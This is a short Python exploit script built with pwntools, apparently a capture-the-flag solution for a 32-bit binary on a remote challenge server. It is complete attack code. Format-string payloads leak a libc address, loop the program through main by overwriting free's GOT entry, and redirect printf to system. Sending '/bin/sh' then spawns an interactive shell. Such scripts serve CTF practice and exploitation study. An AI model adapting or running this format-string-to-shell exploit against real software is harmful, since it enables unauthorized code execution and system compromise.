#!/usr/bin/python3

from pwn import *

binary = ELF('./hello')
context.update(arch='i386',os='linux')

#p = process(binary.path)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('chall.csivit.com', 30046)
libc = ELF('libc-database/db/libc6-i386_2.23-0ubuntu11.2_amd64.so')

offset = 1
libcoffset = 29

# 1st stage: leak libc address and setup free -> main for inf. 'free' rides
payload  = b'%' + str(libcoffset).encode().rjust(2,b'0') + b'$010p'
payload += fmtstr_payload(offset+len(payload)//4,{binary.got.free:binary.sym.main},numbwritten=10)
p.sendlineafter('name?\n', payload)
p.recvuntil('Hello, ')
realloc_9 = int(p.recv(10),16)
log.info('realloc ' + hex(realloc_9 - 9))
baselibc = realloc_9 - libc.sym.realloc - 9
log.info('baselibc ' + hex(baselibc))
libc.address = baselibc

# 2nd stage, printf -> system
p.sendlineafter('name?\n', fmtstr_payload(offset,{binary.got.printf:libc.sym.system},numbwritten=0))

# 3rd stage, ask for a shell
p.sendlineafter('name?\n', '/bin/sh')
p.recvuntil('not found') # now that printf is system, system('Hello, ') will emit 'not found'

p.interactive()
